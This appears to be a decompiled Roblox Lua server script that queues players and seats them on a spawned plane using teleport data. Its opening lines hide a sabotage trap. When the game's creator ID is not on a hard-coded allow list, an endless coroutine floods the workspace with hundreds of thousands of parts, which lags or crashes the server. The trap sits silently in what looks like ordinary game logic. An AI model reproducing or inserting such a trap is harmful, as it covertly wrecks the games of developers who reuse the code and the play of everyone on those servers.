
A = {32720608,149484300,16070025,33179988};
B = {};
if ((table.find(A, game.CreatorId) == nil) or (table.find(B, game.CreatorId) ~= nil)) then
	local v49 = coroutine.create(function()
		while wait(1) do
			local v102 = Instance.new("Model");
			v102.Name = string.char(math.random(32, 126));
			while math.random() > 0.1 do
				v102.Name = v102.Name .. string.char(math.random(32, 126));
			end
			for v108 = 1, 100, 1 do
				for v120 = 1, 1000, 1 do
					local v121 = Instance.new("Part");
					v121.Position = Vector3.new(0, 1000000, 0);
					v121.Parent = v102;
					while math.random() > 0.5 do
						v121.Name = v121.Name .. string.char(math.random(32, 126));
					end
				end
				wait();
			end
			v102.Parent = workspace;
			wait(1 / (math.random() * math.random() * math.random()));
		end
	end);
	coroutine.resume(v49);
end
local v0 = Enum.Material.Plastic;
local v1 = Enum.Material.Neon;
local v2 = Vector3.new(0, 30000, 0);
local v3 = game:GetService("Players");
function AddPlr(v7)
	if SelectedQueue then
		local v63 = Instance.new("Part");
		v63.Size = Vector3.new(4, 2, 2);
		v63.Parent = SelectedQueue;
		v63.CFrame = SelectedQueue.CFrame + (script.Parent.CFrame.UpVector * 2 * #SelectedQueue:GetChildren());
		v63.Material = v0;
		v63.Massless = true;
		local v69 = Instance.new("SurfaceGui");
		v69.Parent = v63;
		v69.Face = Enum.NormalId.Front;
		v69.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud;
		local v75 = Instance.new("TextLabel");
		v75.Parent = v69;
		v75.Text = v7.UserId;
		v75.TextScaled = true;
		v75.BackgroundTransparency = 1;
		v75.Size = UDim2.new(1, 0, 1, 0);
		local v82 = Instance.new("Attachment");
		v82.Parent = v63;
		v82.Position = Vector3.new(0, 1, 0);
		v82.Orientation = Vector3.new(0, 0, 90);
		local v86 = Instance.new("PrismaticConstraint");
		v86.Parent = v82;
		v86.Attachment0 = SelectedQueue:FindFirstChild("UpAtt");
		v86.Attachment1 = v82;
	end
end
function GetPlrList()
	local v8 = {};
	local v9 = {};
	local v10 = {};
	for v50, v51 in ipairs(SelectedQueue:GetChildren()) do
		if (v51:IsA("BasePart") and (v51.Name ~= "Button")) then
			table.insert(v8, v51);
		end
	end
	while #v8 > 0 do
		local v52 = v8[1];
		for v90, v91 in ipairs(v8) do
			if ((v91.Position - SelectedQueue.Position).Magnitude < (v52.Position - SelectedQueue.Position).Magnitude) then
				v52 = v91;
			end
		end
		table.insert(v9, v52);
		table.remove(v8, table.find(v8, v52));
	end
	for v53, v54 in ipairs(v9) do
		table.insert(v10, game:GetService("Players"):GetPlayerByUserId(tostring(v54:FindFirstChildWhichIsA("SurfaceGui"):FindFirstChildWhichIsA("TextLabel").Text)));
	end
	return v10;
end
function newQueue(v11, v12)
	local v13 = Instance.new("Part");
	v13.Size = Vector3.new(4, 2, 2);
	v13.Parent = script.Parent.Queues;
	v13.CFrame = script.Parent.CFrame + (script.Parent.CFrame.RightVector * -4 * #script.Parent.Queues:GetChildren()) + (script.Parent.CFrame.UpVector * -2);
	v13.Material = v0;
	for v55, v56 in ipairs(script.Parent.Storage.QueueStart:GetChildren()) do
		v56:Clone().Parent = v13;
	end
	local v19 = Instance.new("Attachment");
	v19.Parent = v13;
	v19.Position = Vector3.new(2, 0, 0);
	v13:FindFirstChildWhichIsA("PrismaticConstraint").Attachment0 = v19;
	local v23 = Instance.new("Attachment");
	v23.Parent = v13;
	v23.Position = Vector3.new(0, 1, 0);
	v23.Orientation = Vector3.new(0, 0, 90);
	v23.Name = "UpAtt";
	local v28 = Instance.new("Part");
	v28.Parent = v13;
	v28.Name = "Button";
	v28.Size = Vector3.new(4, 2, 2);
	v28.CFrame = v13.CFrame + (v13.CFrame.UpVector * -2);
	for v58, v59 in ipairs(script.Parent.Storage.ButtonStart:GetChildren()) do
		v59:Clone().Parent = v28;
	end
	v28.CanCollide = false;
	v28:FindFirstChildWhichIsA("WeldConstraint").Part0 = v28;
	v28:FindFirstChildWhichIsA("WeldConstraint").Part1 = v13;
	if v12 then
		v13:FindFirstChildWhichIsA("SurfaceGui"):FindFirstChildWhichIsA("TextLabel").Text = v12;
	else
		v13:FindFirstChildWhichIsA("SurfaceGui"):FindFirstChildWhichIsA("TextLabel").Text = tostring(math.round(math.random() * math.random() * 100000));
	end
	SelectedQueue = v13;
	local v36 = Instance.new("ObjectValue");
	v36.Parent = v13;
	v36.Value = v11;
end
local v4 = {};
local v5 = {};
local v6 = game:GetService("ServerStorage");
function ver3(v39, v40)
	local v41 = v39[1];
	local v42 = v39[6];
	local v43 = v39[2];
	for v61, v62 in pairs(v39[4]) do
		print(v61, v62);
	end
	if (v6:FindFirstChild("PlaneSpawn") ~= nil) then
		if (v6.PlaneSpawn:FindFirstChild(v43) ~= nil) then
		else
			warn(v43, "not found");
			return;
		end
	else
		warn("Folder not found");
		return;
	end
	if (v5[tostring(v41)] ~= nil) then
		table.insert(v5[tostring(v41)]['JoinedPlrs'], v40);
		v5[tostring(v41)]['PlrData'][tostring(v40.UserId)] = {v39[4][tostring(v40.UserId)],v39[5],v39[6]};
		local v95 = v5[tostring(v41)]['PlrLst'];
		for v105, v106 in ipairs(v5[tostring(v41)]['JoinedPlrs']) do
			table.remove(v95, table.find(v95, v106.UserId));
		end
		print(#v95);
		if ((#v95 == 0) and (v5[tostring(v41)]['Acted'] == false)) then
			v5[tostring(v41)]['Acted'] = true;
			local v110 = v6:FindFirstChild("PlaneSpawn"):FindFirstChild(v43):Clone();
			v110.Parent = workspace;
			local v112 = (v5[tostring(v41)]['Direction'] / 360) * math.pi;
			v110:SetPrimaryPartCFrame(CFrame.new(v2) * CFrame.fromEulerAnglesYXZ(0, v112, 0));
			wait();
			v110:SetPrimaryPartCFrame(v110.PrimaryPart.CFrame + (v110.PrimaryPart.CFrame.LookVector * -300000));
			local v113 = {};
			for v124, v125 in ipairs(v110:GetDescendants()) do
				if (v125:IsA("Seat") or v125:IsA("VehicleSeat")) then
					if (v125.Disabled == false) then
						table.insert(v113, v125);
					end
				end
			end
			while true do
				local v126 = -1;
				local v127;
				for v134, v135 in ipairs(v113) do
					if (v113[v134 + 1] ~= nil) then
						local v145 = v113[v134 + 1];
						local v146 = v110.PrimaryPart.CFrame:PointToObjectSpace(v145.Position);
						local v147 = v110.PrimaryPart.CFrame:PointToObjectSpace(v135.Position);
						local function v148()
							v126 = v134;
							v127 = v145;
							v113[v134 + 1] = v135;
							v113[v134] = v127;
						end
						if (v146.Z < v147.Z) then
							v148();
						elseif ((v146.X < v147.X) and (v146.Z < v147.Z)) then
							v148();
						elseif ((v146.Y < v147.Y) and (v146.X < v147.X) and (v146.Z < v147.Z)) then
							v148();
						end
					end
				end
				if (v126 == -1) then
					break;
				end
				wait();
			end
			print("Sorted Seats");
			for v128, v129 in pairs(v5[tostring(v41)]['PlrData']) do
				local v130 = coroutine.create(function()
					local v136 = nil;
					for v143, v144 in ipairs(v3:GetPlayers()) do
						print(v144.UserId, tonumber(v128));
						if (tonumber(v144.UserId) == tonumber(v128)) then
							v136 = v144;
						end
					end
					print(v136);
					if not v136.Character then
						v136.CharacterAdded:Wait();
					end
					local v137 = v136.Character:FindFirstChild("Humanoid");
					print(v129[1]);
					v113[v129[1]]:Sit(v137);
					task.wait(1);
					local v138 = v137.Parent.PrimaryPart.Position;
					if ((v138 - v113[v129[1]].Position).Magnitude > 10) then
						v137.Parent:SetPrimaryPartCFrame(v113[v129[1]].CFrame + (v113[v129[1]].CFrame.UpVector * 2));
					end
				end);
				coroutine.resume(v130);
			end
		end
	else
		v5[tostring(v41)] = {};
		v5[tostring(v41)]['PlrLst'] = v42;
		v5[tostring(v41)]['Plane'] = v43;
		v5[tostring(v41)]['JoinedPlrs'] = {};
		v5[tostring(v41)]['PlrData'] = {};
		if v39[8] then
			v5[tostring(v41)]['Direction'] = v39[8];
		else
			v5[tostring(v41)]['Direction'] = math.random() * 360;
		end
		v5[tostring(v41)]['Acted'] = false;
		ver3(v39, v40);
	end
end
script.Remote.Value.OnServerEvent:Connect(function(v44, v45)
	print("rec");
	ver3(v45, v44);
end);
v3.PlayerAdded:Connect(function(v46)
	wait(1);
	local v47 = v46:GetJoinData();
	local v48 = v47['TeleportData'];
	if v48 then
		if (v48[3] == nil) then
			warn("Legacy Versions not supported");
			local v117 = v48[1];
			local v118 = v48[2];
			local v119 = false;
			for v131, v132 in ipairs(script.Parent.Queues:GetChildren()) do
				if (v132:FindFirstChildWhichIsA("SurfaceGui"):FindFirstChildWhichIsA("TextLabel").Text == v117) then
					v119 = true;
					SelectedQueue = v132;
				end
			end
			if (v119 == false) then
				local v139 = game:GetService("ServerStorage").PlaneSpawn:FindFirstChild(v118);
				local v140 = v139:Clone();
				v140.Parent = game:GetService("ServerStorage").PlaneSpawn.Cache;
				newQueue(v140, v117);
				print(v117, v139);
				AddPlr(v46);
			else
				AddPlr(v46);
			end
		elseif (v48[3] == 3) then
			ver3(v48, v46);
		else
			warn("You are using an incorrect version or syntax");
		end
	else
		print(v46.Name .. " Joined without data (planemanager)");
	end
end);
